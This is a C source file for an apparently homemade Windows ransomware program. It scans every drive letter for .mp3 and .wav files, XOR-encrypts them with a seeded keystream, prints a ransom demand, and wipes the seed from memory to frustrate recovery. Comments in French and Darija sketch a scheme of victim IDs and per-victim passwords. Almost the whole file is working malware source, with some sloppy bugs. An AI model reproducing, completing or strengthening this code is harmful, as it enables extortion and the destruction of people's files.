#include <dirent.h>
#include <stdio.h>
//#include <sys/types.h>
//#include <sys/stat.h>
//#include <unistd.h>
//#include<stdio.h>
#include<stdlib.h>
//#include<unistd.h>
//#include<fcntl.h>
//#include<sys/types.h>
//#include<sys/stat.h>
//#include<string.h>
//#include <getopt.h>
//#include <dirent.h>
#include <errno.h>
#include "ListesChaines.h"
#include <windows.h>
#define _WIN32_WINNT 0x0500
#define MAX_FILENAME_LENGTH 5000


void strcut(char entre[MAX_FILENAME_LENGTH],char sortie[MAX_FILENAME_LENGTH]){
    int i;
	for(i=0;i<strlen(entre)-4;i++ ){
    	sortie[i]=entre[i];
	}
	sortie[i]='\0';
}


//---------------------------
int isDIR( char* name)
{
    //printf("%s",name);
    DIR* directory = opendir(name);

    if(directory != NULL)
    {
     closedir(directory);
     return 0;
    }

    if(errno == ENOTDIR)
    {
     return 1;
    }

    return -1;
}

int  list_dir(char* argv1, Element** Tete)
{
	//Element* tete=*Tete;
	DIR *dir;
	struct dirent *p;
	char fic[MAX_FILENAME_LENGTH]="",fic1[MAX_FILENAME_LENGTH],fic3[MAX_FILENAME_LENGTH];

	//printf("le repertoir est : %s\n",argv1);
	dir = opendir(argv1);

	while((p = readdir(dir))!=NULL)
	{
		strcpy(fic1,argv1);
	//  printf("ani dkhalt\n");
		strcpy(fic,p->d_name);
		// printf("\t%s\n",fic);

	if (strcmpi(p->d_name,".")==0 || strcmpi(p->d_name,"..")==0) {int t=0;}//printf("hihi\n")
	else{

		//  printf("%s fiq \n",fic1);
		//  printf("%s\n",fic);
			strcat(fic1,"/");
			strcat(fic1,fic);
		//   printf("%s \n",fic1);
		//  printf("ok\n");
		if (isDIR(fic1)==1){
		//  printf(" Nom fichier :%s \n", fic1);
			if(((strlen(fic1)> 3) && (fic1[strlen(fic1)-1]=='3') && (fic1[strlen(fic1)-2]='p') && (fic1[strlen(fic1)-3]='m'))
				|| ((strlen(fic1)> 3) && (fic1[strlen(fic1)-1]=='v') && (fic1[strlen(fic1)-2]='a') && (fic1[strlen(fic1)-3]='w')))
							{
			InsertElt(Tete,fic1);}
			strcpy(fic1,"");

			}
			else if (isDIR(fic1)==0)
				{
		list_dir(fic1,Tete);
			}
			}

	}
	closedir(dir);
	return 0;
}
//----------------------rena�e
#include<stdio.h>

int renommer(Element* Tete)
{
    Element* p=Tete;


	printf("Current filename: %s",p->path);
	//gets_s(buffer_old, 100);

	printf("New filename: ");
	//gets_s(buffer_new, 100);
    while(p!=NULL){
        char  buffer_old[1000], buffer_new[1000];
        strcpy(buffer_old,p->path);
        strcpy(buffer_new,p->path);
        strcat(buffer_new,"4");
	rename(buffer_old, buffer_new);

	p=p->Suivant;
}

}

//---------------------cryptage----------------------
void CryptageFichiersOuverts(FILE *pfIn, FILE *pfOut)
{
	int carac;
	int clef;
	while((carac = fgetc(pfIn)) != EOF)
	{
		clef = rand() % 256;
		int xored = carac ^ clef;
		fputc(xored, pfOut);
	}

}

void Cryptage(const char nomFichSrc[MAX_FILENAME_LENGTH], const char *nomFichDest)
{
	FILE *pfIn = fopen(nomFichSrc, "r");
	if(pfIn == NULL)
	{
		//puts("Echec d'ouverture du fichier source.");
		int t=0;
	}
	else
	{
		FILE *pfOut =NULL;
		pfOut= fopen(nomFichDest, "w");
		if(pfOut == NULL)
		{int t=0;
			//puts("Echec d'ouverture du fichier destination.");
		}
		else
		{
			CryptageFichiersOuverts(pfIn, pfOut);
			fclose(pfOut);
		}

		fclose(pfIn);
	}

}

void DemandeEtCrypte(char nomFich[MAX_FILENAME_LENGTH])
{
	//char nomFich[300] = "";
	char *pRetour = NULL;

	//int clef=12345678; // hadi na9adrouha ndirouha plus tard random ( ngeneriw 2 random numbers num wahad comme id w num
	                   // wahdokher comme mot de passe .... ncrypter b le mot de passe w nab3at lya id + mdp apres nweri la
	                   // victime ghir id bach na9der nrecupiri pour chaque victime son mdp

	//printf("Nom du fichier a crypter : %s\n",nomFich);
	char nomcry[MAX_FILENAME_LENGTH];
	//strcpy(nomcry,nomFich);
	strcut(nomFich,nomcry);
	if(nomFich[strlen(nomFich)-1]=='3') strcat(nomcry,"CRYPTED.mp3");
    else strcat(nomcry,"CRYPTED.wav");
	//fflush(stdout); // N�cessaire si une ligne ne se termine pas par \n - fflush(stdout) : fonction qui vide le tampon de sortie.

	/* On lit le nom du fichier,
	   puis on v�rifie qu'il rentre en entier dans la zone de 300 caract�res.
	   S'il rentre, le \n sera dedans, et il faudra le supprimer.
	   Si �a ne rentre pas, le \n ne sera pas dedans, et on dira Erreur. */

	//fgets(nomFich, 300, stdin);
	//pRetour = strchr(nomFich, '\n');
	/*if(pRetour == NULL)
	{
		// Le \n final n'est pas dans le nom de fichier.
		puts("Nom de fichier trop grand.\n");
	}
	else
	{
		// Le \n est pr�sent : OK, on tronque la cha�ne ici.
		*pRetour = '\0';*/



		Cryptage(nomFich, nomcry);
		printf ("fichier crypt�\n");
		//}
}




/*
the encryption key now is the seed,before this,
the key was weak and repeated,a simple
repeated key xor attack can reveal all the 
plaintext
but since the key is the seed now,the cipher became
an OTP(one time pad) and all you have to do is to recover
the seed in order to decrypt the files
*/
int main(void)
{
	long seed = 215489151;//random seed that can be hard coded or entered as a cmd arg
    	int ID = rand() % 500;
	char* chC="C:/";
	char* chD="D:/";
	char* chE="E:/";
	char* chF="F:/";
	char* chG="G:/";
	char* chH="H:/";
	char* chI="I:/";
	char* chJ="J:/";
	char* chK="K:/";
	char* chL="L:/";
	char* chM="M:/";
	char* chN="N:/";
	char* chO="O:/";
	char* chP="P:/";
	char* chQ="Q:/";
	char* chR="R:/";
	char* chS="S:/";
	char* chT="T:/";
	char* chU="U:/";
	char* chV="V:/";
	char* chW="W:/";
	char* chX="X:/";
	char* chY="Y:/";
	char* chZ="Z:/";
	char* chA="A:/";
	char* chB="B:/";
	Element* Tete=NULL;
	int i=list_dir(chD,&Tete);
	i=list_dir(chC,&Tete);
	i=list_dir(chE,&Tete);
	i=list_dir(chF,&Tete);
	i=list_dir(chG,&Tete);
	i=list_dir(chH,&Tete);
	i=list_dir(chI,&Tete);
	i=list_dir(chJ,&Tete);
	i=list_dir(chK,&Tete);
	i=list_dir(chL,&Tete);
	i=list_dir(chM,&Tete);
	i=list_dir(chN,&Tete);
	i=list_dir(chO,&Tete);
	i=list_dir(chP,&Tete);
	i=list_dir(chQ,&Tete);
	i=list_dir(chR,&Tete);
	i=list_dir(chS,&Tete);
	i=list_dir(chT,&Tete);
	i=list_dir(chU,&Tete);
	i=list_dir(chV,&Tete);
	i=list_dir(chW,&Tete);
	i=list_dir(chX,&Tete);
	i=list_dir(chY,&Tete);
	i=list_dir(chZ,&Tete);
	i=list_dir(chA,&Tete);
	i=list_dir(chB,&Tete);
	//printf("\n\n\n--------------------------------------------------------------------");
	//AffichageElts(Tete);
	srand(seed);
	Element* p=Tete;
	while(p!=NULL){
		DemandeEtCrypte(p->path);
		p=p->Suivant;
	}
	SuppElts(Tete);
	//renommer(Tete);
	printf("----------------------------------------------------------------------------------\n");
	printf("You have been hacked you need to pay a ransom ......\n");
	printf("----------------------------------------------------------------------------------\n");
	seed = 0;//to remove the seed from the memory in case the victim tries a memory dump to extract it

}

